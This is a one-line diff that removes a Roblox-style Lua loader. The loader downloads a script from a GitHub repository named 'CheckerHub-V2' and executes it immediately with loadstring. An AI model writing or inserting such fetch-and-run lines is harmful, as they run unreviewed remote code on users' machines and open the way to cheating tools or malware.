@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ifjog4tbn/CheckerHub-V2/main/key"))()
